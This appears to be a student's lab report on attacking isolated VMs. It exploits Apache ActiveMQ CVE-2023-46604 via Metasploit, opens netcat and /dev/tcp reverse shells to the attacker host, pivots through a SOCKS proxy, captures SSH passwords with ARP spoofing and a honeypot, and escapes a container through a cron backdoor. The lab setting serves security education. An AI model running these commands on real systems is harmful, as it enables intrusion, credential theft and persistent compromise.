# Lab 3 - Software Vulnerabilities

> Ahmed Nouralla - a.shaaban@innopolis.university

[TOC]

## Task 1 - Setup Infrastructure

- Created three Ubuntu 24.04 Cloud Guest VMs in QEMU/KVM ([installation](https://christitus.com/vm-setup-in-linux/))

  - `vuln` is a vulnerable node that is:
    - Reachable from an external attacker (my host, also the NAT gateway)
    - Member of an internal isolated network `10.0.0.0/24`.
  - `kingdom` is an interesting target that is:
    - Reachable from the `vuln` through the internal network.
    - Running OpenSSH server with password authentication enabled. 
  - `client` is another machine in the internal network
    - It may perform password-based SSH access to `kingdom`

- Created the topology in GNS3 for convenience

  > Check [Appendix](#Appendix) for initial setup commands in QEMU/KVM

  ![image-20250422034409366](https://i.imgur.com/isLixyX.png)

- Commands used

  ```bash
  # Change hostname and add static IPs to vuln node
  echo "vuln" | sudo tee /etc/hostname
  sudo hostname vuln
  sudo ip a add 10.0.0.1/24 dev ens3
  sudo ip link set ens3 up
  dhcpcd ens4 # DHCP on ens4 (obtained address shown above)
  
  # Similar steps for kingdom node
  echo "kingdom" | sudo tee /etc/hostname
  sudo hostname kingdom
  sudo ip a add 10.0.0.2/24 dev ens3
  sudo ip link set ens3 up
  
  # Similar steps for client node
  echo "client" | sudo tee /etc/hostname
  sudo hostname client
  sudo ip a add 10.0.0.3/24 dev ens3
  sudo ip link set ens3 up
  ```

- Verify IPv4 addresses and interfaces (logged in to GNS3 machines via `telnet` for initial setup)

  ![image-20250421220922325](https://i.imgur.com/XCAY6gz.png)

- Command `ip a` is a short for `ip address show`
  - `-4` shows only IPv4
  - `-o` for oneliner output
  - `dev <dev>` to show information about a specific interface on my host.
  - `| cut -d'/' -f1` to cut output and show only addresses

<div style="page-break-after: always; break-after: page;"></div>

## Task 2 - Perform an Exploitation

- Setting up a demo for exploiting [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/cve-2023-46604)

  - Affects Apache ActiveMQ (Message Broker) versions 5.16.0 and earlier.
  - Exploits OpenWire Protocol marshaller to achieve RCE by manipulating serialized class types to cause the broker to instantiate any class on the classpath.

- Prepare `vuln` VM by running the vulnerable service in docker

  ```bash
  docker run -d --name activemq --user 0 --network host ktxcx/activemq:5.16.0
  ```

- The following insecure options are intentionally supplied for making an interesting PoC:

  - `--network host`: places the container in the host's network; the lazy way some admins use to simulate a native service installations and avoid having to deal with isolated docker networks.
  - `--user 0`: runs the container under the root user. An admin may forget to create unprivileged user when writing `Dockerfile`, or use the option intentionally to facilitate debugging with `docker exec`.
  - Without these options (using port forwarding instead), the exploit would still work and give a shell as `activemq` user in the isolated docker network.

- Scanning `vuln` from attacker machine

  - Initial `nmap` full port scan shows three open ports: 22 (SSH), 8161, 61616
  - Port 8161 runs an HTTP server (ActiveMQ admin panel). Basic Auth is enabled (hence the 401 error).
  
  ![image-20250417235900763](https://i.imgur.com/pSLV7JQ.png)
  
- It's worth noting that the default ActiveMQ credentials are set to `admin:admin` unless configured otherwise, but we will not use this knowledge in exploitation.

  ![image-20250421034515261](https://i.imgur.com/8DtnYNJ.png)

- Port 61616 is used by ActiveMQ OpenWire transport (target). **It does not require authentication**.

  ![image-20250418000213283](https://i.imgur.com/G0FjDn6.png)

- Identified vulnerable ActiveMQ version 5.16.0 for which there is a ready-made metasploit [module](https://www.rapid7.com/db/modules/exploit/multi/misc/apache_activemq_rce_cve_2023_46604/).

  ```bash
  $ msfconsole
  > use multi/misc/apache_activemq_rce_cve_2023_46604
  > set RHOSTS 192.168.122.172
  > set RPORT 61616
  > set LHOST 192.168.122.1
  > set LPORT 4444
  > set SRVPORT 5555
  > set TARGET 1
  > set PAYLOAD cmd/linux/http/x64/shell/reverse_tcp
  > exploit
  ```

- Running the exploit gives a `root` shell **in the container**.

  ![image-20250420215750423](https://i.imgur.com/OJRu8gA.png)

- From there, we may run a reverse shell for convenience

  ```bash
  # On attacker Machine
  nc -lvnp 9000
  
  # On "exploit shell" obtained above (payload from revshells.com)
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.122.1 9000 >/tmp/f
  ```

  ![image-20250421030901073](https://i.imgur.com/VRqJogs.png)

- Now we infiltrate the network further to scan for more valuable targets. A scan of the internal network shows that 10.0.0.2 (kingdom) have SSH service enabled (had to install `nmap` to run the scan, an unprivileged user may `wget` a [portable](https://github.com/opsec-infosec/nmap-static-binaries) `nmap` binary, use it, then delete it).

  ![image-20250421004613632](https://i.imgur.com/w4pElYL.png)

- However, to keep footprint minimal, it's better not to install any tools on the compromised host. For that, we setup a SOCKS proxy to route traffic generated by attacker tools (running locally) to the internal network `10.0.0.0/24` and reroute answers back to the tool.

  ```bash
  # Re-run the exploit, but with meterpreter payload instead
  $ msfconsole
  > use multi/misc/apache_activemq_rce_cve_2023_46604
  ... # same options as above
  > set PAYLOAD cmd/linux/http/x64/meterpreter/reverse_tcp
  > exploit
  
  # Create a proxy to the internal network, accessible at 127.0.0.1:9050
  > use auxiliary/server/sockes_proxy
  > set SRVHOST 127.0.0.1
  > set SRVPORT 9050
  > run
  > sessions # show active sessions
  > route add 10.0.0.0 255.255.255.0 1 # add route to 10.0.0.0/24 via session 1
  > route # verify routes
  ```

- Verification

  ![image-20250421030313195](https://i.imgur.com/GhWWEY8.png)

- Confirm our previous finding by running `nmap` scan through the proxy

  ```bash
  sudo apt install proxychains
  echo "socks5 127.0.0.1 9050" >> /etc/proxychains.conf
  proxychains nmap -p22 -A 10.0.0.2
  ```
  
  ![image-20250421034030191](https://i.imgur.com/o358lbL.png)

## Task 3 - Attack Kingdom host

- Given that
  - `vuln` node is part of the internal network in which the `kingdom` node resides.
  - We have root access to `vuln` node through the exploit (check task 4)
  - Client may perform password-based SSH to the server.

- We can

  - Run an SSH honeypot on the compromised `vuln` server
  - Spoof IP addresses to deceive client into connecting to the compromised server instead of `kingdom`.
  - Intercept the password used by `client` when trying to SSH to `kingdom`
  - Use it to gain access to `kingdom` directly.

- Commands used (in `vuln` machine as `root`)

  - ARP spoofing: tell `kingdom` that our machine is `client` and tell `client` that our machine is `kingdom`.

    ```bash
    apt update && apt install dsniff
    arpspoof -i ens3 -t 10.0.0.3 -r 10.0.0.2
    ```

  - Unsolicited ARP responses will keep flooding the network to poison caches on the hosts.

    ![image-20250422032003800](https://i.imgur.com/p7nCvgp.png)

  - Showing polluted ARP caches on both hosts

    - Now `ping 10.0.0.2` will reach `10.0.0.1` instead, confirmed in Wireshark.

    ![image-20250422032324934](https://i.imgur.com/ZSVOHbF.png)

  - Open another shell on the vulnerable machine and run an SSH honeypot

    ```bash
    # Forward incoming SSH traffic to port 1234
    iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 1234
    
    # Run Cowrie (SSH honeypot), it logs all SSH auth traffic coming to port 1234
    docker run -p 1234:2222 cowrie/cowrie:lates
    ```

  - Client will be trying to SSH to kingdom at `10.0.0.2`.

    - Due to ARP spoofing, they will actually reach the compromised server at `10.0.0.1` where we run the honeypot.

    ![image-20250422181639969](https://i.imgur.com/WFgLPAX.png)

  - If client blindly accepts the fingerprint and writes the password, it's going to be caught.

    - Captured credentials in plain `ubuntu:kingdom-pass`.
    - We can use them to directly SSH to `kingdom`

    ![image-20250422033004415](https://i.imgur.com/yElUJlz.png)

- Note that fingerprint validation is going to fail with an error if the client connected to kingdom before and registered it in known hosts. This is an additional security feature in SSH to prevent this type of attacks.

## Task 4 - Privilege Escalation

- So far, we only had access to the root user **inside the docker container**, but no access to the docker host. This already gives many exploitation opportunities!

- Let's make a more interesting scenario for container escape. Re-run the container as:

  ```bash
  docker run -d --name activemq --user 0 -v /etc/crontab:/host/crontab ktxcx/activemq:5.16.0
  ```

- Instead of `--network host`, a volume was created mapping the `crontab` file of host to the container at `/host/crontab`.

  - An admin may bind-mount volumes for multiple reasons (preserving data, debugging, etc.), some even do `-v /:/mnt/host` which introduces much more security issues.
  - Exploitation targets that should not be bind-mounted include `crontab` files, docker socket `/var/run/docker.so`, binaries with `setuid` bit, `/etc/passwd` file, and `~/.ssh` directory.

- After executing the same metasploit module above and getting container access, attacker may gather info about mounted file systems (e.g., from the output of `mount` command)

  ![image-20250422042522898](https://i.imgur.com/iNLyj6a.png)
  
- Exploit command

  ```bash
  echo "* * * * * root bash -c 'bash -i >& /dev/tcp/192.168.122.1/4444 0>&1'" >> /host/crontab
  ```

- This will schedule a cron job at every minute to try connecting to a reverse shell (listener to be run on attacker), effectively escaping the container and giving **root access to the docker host**.

  ![image-20250421072036287](https://i.imgur.com/tmarKYX.png)

## Bonus

1. ARP Spoofing is done in task 3 with `dsniff` as shown above.
1. The cron job created in task 4 persists across reboots, meaning that even if the ActiveMQ vulnerability was patched, the system will periodically try to connect to our reverse shell (i.e., it serves as a backdoor).

## Appendix

Commands to create the infra in QEMU/KVM (alternative to GNS3)

```bash
# Obtain an Ubuntu Cloud guest
wget https://cloud-images.ubuntu.com/releases/noble/release-20241004/ubuntu-24.04-server-cloudimg-amd64.img

# Download cloud-init file from GNS3 website, preconfigured with
#  credentials ubuntu:ubuntu and openssh-server installed
wget https://github.com/GNS3/gns3-registry/raw/master/cloud-init/ubuntu-cloud/ubuntu-cloud-init-data.iso

# Prepare and resize the images
cp ubuntu-24.04-server-cloudimg-amd64.img /var/lib/libvirt/images/vuln.img
cp ubuntu-24.04-server-cloudimg-amd64.img /var/lib/libvirt/images/kingdom.img
cp ubuntu-24.04-server-cloudimg-amd64.img /var/lib/libvirt/images/client.img
qemu-img resize /var/lib/libvirt/images/vuln.img +5G
qemu-img resize /var/lib/libvirt/images/kingdom.img +5G
qemu-img resize /var/lib/libvirt/images/client.img +5G

# Create the VMs in virt-manager (or use qemu-system-x86_64)
bash -c 'virt-manager'

# Create isolated network
sudo virsh net-define /dev/stdin <<EOF
<network>
  <name>isolated</name>
  <bridge name='virbr-isolated'/>
  <forward mode='none'/>
</network>
EOF

# Start and enable it
sudo virsh net-start isolated
sudo virsh net-autostart isolated

# Verify network list
sudo virsh net-list --all

# Attach both VMs to the isolated network (can be done from virt-manager GUI: Add hardware -> NIC)
sudo virsh attach-interface vuln --source isolated --type network --model virtio --config --persistent
sudo virsh attach-interface kingdom --source isolated --type network --model virtio --config --persistent
```

